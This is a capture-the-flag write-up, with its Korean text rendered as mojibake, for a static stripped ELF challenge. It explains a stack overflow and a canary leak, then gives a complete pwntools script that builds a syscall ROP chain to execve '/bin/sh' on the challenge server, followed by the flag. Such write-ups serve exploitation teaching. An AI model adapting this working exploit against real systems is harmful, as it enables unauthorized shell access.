1. Binary

----------

![](https://lh3.googleusercontent.com/30jp43G1peSoaTKeRUwwDruSbj4XJPeXdRwlgoEQYvEM8t74hABaLQ7Q4WDndC1Lg2-E9BQp4O8OC0vYZPgorry0nXMVJLxgD9LXecK0zHWuh7E-SAZF1bJ3JgS7Cp2NbMG6ZENg)

�� ���̳ʸ��� ELF 64bit �����Դϴ�. static �������� �Ǿ� �־���, strip�� �����̿����ϴ�.

static �����ϰ� strip�� �Ǿ��־ �м��� ��������� gdb�� �帧�� ������ �м��Ͽ����ϴ�.

2. Vulnerability

----------

�޴� 2. Edit message���� message�� �Է� �޴µ�, ���⼭ buffer overflow ������� �߻��մϴ�.

![](https://lh4.googleusercontent.com/H-MRa7p21Sfj16r6UWCP2MjpzUMPzuZ5oYkht_fLMQtMFxwg0Fl84wgRW0G0BgSBTk0VF5pcbMGjCTOlaScz092GBhAOOiEWKYyG9txbLmaryCIApToHZjUBafx75bNfqiUHELnd)

����° ������ edx �� 400���� ���� �Ǿ� �ֽ��ϴ�. �̴� 1024��ŭ �Է��� ���� �� �ְ� �˴ϴ�.

![](https://lh4.googleusercontent.com/ctjVB282zddqRF4IsuXfUfHozYMTmCx0QHQ22fE7D1EQn3_GSBLaKWIipt5h3ZwodEXIYtQ3M0y06fmZqkDnxU9cPp3WcE1RpHZecuIWxuWgnma01FRyk_-spAfRt1GVaTh-n5ST)

sys_input? �Լ��� ���� eax�� 0���� �����ϰ� syscall �ϴ� ���� �� �� �ֽ��ϴ�. 64��Ʈ���� sys_read�� rax�� 0���� ���õǾ������� ȣ�� �˴ϴ�.

![](https://lh3.googleusercontent.com/tfVHbhAUepw4VzGzcN39FcCIvczecNigw48c509WBbZ3SczgkCY2t-2AOOE1NLZUb50jI10eYezeB_OhHzjz8VtCi3K4VaWvh3_6NNC7fbR6LRjzHn7rEN3n8ImHdsI0eWJPbtyt)

�Է��� �޴� v8������ bp - 0xd0 ��ġ�� ������ bp - 208 ��ġ�� �ֽ��ϴ�. 1024��ŭ �Է��� ���� �� ������ bof�� �����մϴ�.

������ bp - 0x8 ��ġ�� canary ������ �ִ� ���� Ȯ�� �� �� �־����ϴ�. ������ �̴� 1. show �޴����� leak�� �����߽��ϴ�.

3. exploit

----------

static �����ϰ� strip �� �Ǿ��־ �Ϲ����� rop�� ���������ϴ�. �ٸ� �� �������� syscall�� �̿��ϱ� ������ ���õ� ������ �����Ͽ���, syscall�� �̿��� rop�� �����ϴٴ� ���� �˾ҽ��ϴ�. canary�� Ȱ��ȭ �Ǿ��ֱ� ������ canary�� ���� leak�� ���� ���� ����, �ٽ� input���� overflow�� rop���ָ� �Ǵ� ���������ϴ�.

canary�� �ι���Ʈ + 7byte �̷��� ������ �Ǵµ�, 1����Ʈ�� overflow�ϸ� ���ڿ��� ���� �ν� ���� �ڿ� ����Ʈ���� leak�� �˴ϴ�.

syscall rop ���� ���� �� syscall rax number�� �������ִµ�, ���� bss ������ ��/bin/sh���� ���� ���� ���� ���� �� read(rax == 0) syscall; ret; �������� ȣ���ѵ� chaining�� ���� rdi�� bss�� �����ϰ� rsi�� 0�� ���� �� �� rax���� execve�� rax number�� 59�� ������ call �߽��ϴ�.

�ؿ��� exploit.py�Դϴ�.

>exploit.py

```python
from pwn import  *

#s = process("./rich")

s = remote("null2root.org", 1797)

e = ELF("./rich")

#context.log_level = 'debug'

gadget =  0x0045e395  # syscall ; ret

prdi =  0x00400535

prsi =  0x004017b7

prax =  0x0046dcb6  # pop rax ; pop rdx ; pop rbx ; ret

s.recvuntil("> ")

s.sendline("2")

s.recvuntil(": ")

leak_payload =  "A"*201

s.send(leak_payload)

s.recvuntil("> ")

s.sendline("1")

s.recvuntil("A"*201)

canary = u64("\x00"+s.recv(7))

log.success("canary : "+ hex(canary))

s.recvuntil("> ")

s.sendline("2")

s.recvuntil(": ")

payload =  "A"*200  + p64(canary)+"AAAAAAAA"

payload += p64(prdi)

payload += p64(0)

payload += p64(prsi)

payload += p64(e.bss())

payload += p64(prax)

payload += p64(0) + p64(0xff) + p64(0)

payload += p64(gadget)

payload += p64(prdi)

payload += p64(e.bss())

payload += p64(prsi)

payload += p64(0)

payload += p64(prax)

payload += p64(59) + p64(0) + p64(0)

payload += p64(gadget)

s.send(payload)

s.recvuntil("> ")

s.sendline("3")

s.recv()

s.send("/bin/sh\x00")

s.recv()

s.interactive()
```

![](https://lh3.googleusercontent.com/XnSyaezo4a0TPR0Q8EsAOcMO94Ui6efVoquawzhGbKUvS1SuVEc6MqmOE1QSLRS1DhEpptMjvTXyumtt96KpKBl6gDB0Yluo1LiXjb2WAnh01OHVbujpDNP6nt2QjFQ3uLxBt2Kf)

FLAG : n2r{enjoying_rich_rop_with_static_binary}

 